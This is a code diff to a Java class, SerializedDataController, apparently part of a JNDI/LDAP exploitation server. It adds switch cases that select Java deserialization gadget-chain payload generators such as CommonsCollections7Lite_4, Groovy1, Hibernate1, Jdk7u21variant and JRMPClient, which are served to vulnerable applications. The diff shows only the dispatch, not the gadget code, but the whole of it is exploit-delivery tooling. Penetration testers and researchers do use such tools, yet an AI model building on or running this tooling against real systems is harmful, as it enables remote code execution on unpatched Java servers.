@@ -73,6 +73,9 @@ public class SerializedDataController implements LdapController {
             case commonscollections7:
                 bytes = CommonsCollections7.getBytes(payloadType, params);
                 break;
+            case commonscollections7lite_4:
+                bytes = CommonsCollections7Lite_4.getBytes(payloadType, params);
+                break;
             case commonscollectionsk1:
                 bytes = CommonsCollectionsK1.getBytes(payloadType, params);
                 break;
@@ -114,6 +117,42 @@ public class SerializedDataController implements LdapController {
                 break;
             case cve_2020_2883:
                 bytes = CVE_2020_2883.getBytes(payloadType, params);
+                break;
+            case jython1:
+                bytes = Jython1.getBytes(payloadType, params);
+                break;
+            case json:
+                bytes = JSON1.getBytes(payloadType, params);
+                break;
+            case groovy1:
+                bytes = Groovy1.getBytes(payloadType, params);
+                break;
+            case hibernate1:
+                bytes = Hibernate1.getBytes(payloadType, params);
+                break;
+            case hibernate2:
+                bytes = Hibernate2.getBytes(payloadType, params);
+                break;
+            case javassistweld1:
+                bytes = JavassistWeld1.getBytes(payloadType, params);
+                break;
+            case jbossinterceptors1:
+                bytes = JBossInterceptors1.getBytes(payloadType, params);
+                break;
+            case jdk7u21variant:
+                bytes = Jdk7u21variant.getBytes(payloadType, params);
+                break;
+            case jrmpclient:
+                bytes = JRMPClient.getBytes(payloadType, params);
+                break;
+            case jrmpclient_activator:
+                bytes = JRMPClient_Activator.getBytes(payloadType, params);
+                break;
+            case jrmpclient_obj:
+                bytes = JRMPClient_Obj.getBytes(payloadType, params);
+                break;
+            case jrmplistener:
+                bytes = JRMPListener.getBytes(payloadType, params);
                 break;
         }
 
